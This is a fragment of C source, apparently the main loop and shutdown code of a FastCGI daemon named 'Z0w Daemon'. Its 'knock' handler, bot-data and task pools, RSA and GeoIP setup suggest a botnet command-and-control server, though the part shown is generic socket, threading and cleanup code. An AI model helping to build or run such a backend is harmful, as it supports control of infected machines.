		exit(1);	 

	gRsaContext.len = (mpi_msb(&gRsaContext.N) + 7) >> 3;

	crc64_buildtable();

	sock = FCGX_OpenSocket(gGlobalConfig.socketPath, 1000);

	if (sock < 0) {
		logger_error("Cannot open listening socket");
		exit(1);	
	}

	chmod(gGlobalConfig.socketPath, 0666);

	logger_info("Z0w Daemon started!");
	
	for ( ; ; ) {
		pRequest = mempool_get(&gFcgiReqPool);
		if (pRequest == NULL) {
			continue;
		}
		FCGX_InitRequest(pRequest, sock, 0);
		rc = FCGX_Accept_r(pRequest);
		if (rc < 0) {
			logger_warn("Failed to accept new FastCGI connection");
			mempool_release(&gFcgiReqPool, pRequest);
			continue;
		}

		pthread_attr_init(&attributes);
		if (pthread_attr_setdetachstate(&attributes, PTHREAD_CREATE_DETACHED) == 0) {
			rc = pthread_create(&pThread, &attributes, handler_knock_thread, (void*)pRequest);
			if (rc) {
				logger_warn("Failed to create new handler thread");
				FCGX_Finish_r(pRequest);
				mempool_release(&gFcgiReqPool, pRequest);
			}
		}
		pthread_attr_destroy(&attributes);
	}
	
	unlink(PID_PATH);
	unlink(LOCK_PATH);

	mempool_done(&gConfigurationPool);
	mempool_done(&gPostBodyPool);
	mempool_done(&gFcgiReqPool);
	mempool_done(&gShaHashPool);
	mempool_done(&gBotDataPool);
	mempool_done(&gQueryPool);
	mempool_done(&gTasksPool);
	geoip_done();
	db_done();
	
	if (gGlobalConfig.socketPath != NULL)
	      	free(gGlobalConfig.socketPath);
	if (gGlobalConfig.syslogIdent != NULL)
		free(gGlobalConfig.syslogIdent);
	if (gGlobalConfig.dbHost != NULL)
	      	free(gGlobalConfig.dbHost);
	if (gGlobalConfig.dbName != NULL)
	      	free(gGlobalConfig.dbName);
	if (gGlobalConfig.dbUser != NULL)
	      	free(gGlobalConfig.dbUser);
	if (gGlobalConfig.dbPassword != NULL)
	      	free(gGlobalConfig.dbPassword);
	
	logger_done();

	return 0;
}
